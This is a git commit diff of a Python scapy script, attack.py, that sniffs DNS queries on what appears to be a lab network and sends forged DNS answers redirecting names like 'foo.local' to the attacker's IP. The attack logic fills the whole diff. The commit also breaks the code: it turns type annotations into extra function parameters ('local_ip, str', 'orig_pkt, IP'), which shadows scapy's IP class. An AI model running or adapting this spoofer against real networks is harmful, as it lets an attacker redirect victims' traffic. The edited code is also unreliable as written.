9d5b7703eeeb355cc818ba05c8233cba172edfaa
Aristide Muhizi <muhizia4@gmail.com>
2020-12-08 23:54:46 +0200

    Add files via upload

--- attack.py
+++ attack.py
@@ -5,13 +5,13 @@ from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP
 IFACE = "s1-eth1"   # Or your default interface
 DNS_SERVER_IP = "10.2.1.1"  # Your local IP
 
-BPF_FILTER = f"udp port 53 and ip dst {DNS_SERVER_IP}"
+BPF_FILTER = "udp port 53 and ip dst " + DNS_SERVER_IP
 
 
-def dns_responder(local_ip: str):
+def dns_responder(local_ip, str):
 
-    def forward_dns(orig_pkt: IP):
-        print(f"Forwarding: {orig_pkt[DNSQR].qname}")
+    def forward_dns(orig_pkt, IP):
+        print("Forwarding: " + orig_pkt[DNSQR].qname)
         response = sr1(
             IP(dst='10.3.2.1')/
                 UDP(sport=orig_pkt[UDP].sport)/
@@ -21,18 +21,18 @@ def dns_responder(local_ip: str):
         resp_pkt = IP(dst=orig_pkt[IP].src, src=DNS_SERVER_IP)/UDP(dport=orig_pkt[UDP].sport)/DNS()
         resp_pkt[DNS] = response[DNS]
         send(resp_pkt, verbose=0)
-        return f"Responding to {orig_pkt[IP].src}"
+        return "Responding to " + orig_pkt[IP].src
 
-    def get_response(pkt: IP):
+    def get_response(pkt, IP):
         if (
             DNS in pkt and
             pkt[DNS].opcode == 0 and
             pkt[DNS].ancount == 0
         ):
             if "foo.local" in str(pkt["DNS Question Record"].qname):
-                spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip)/DNSRR(rrname="trailers.apple.com",rdata=local_ip))
+                spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip)/DNSRR(rrname="foo.local",rdata=local_ip))
                 send(spf_resp, verbose=0, iface=IFACE)
-                return f"Spoofed DNS Response Sent: {pkt[IP].src}"
+                return "Spoofed DNS Response Sent: " + pkt[IP].src
 
             else:
                 # make DNS query, capturing the answer and send the answer
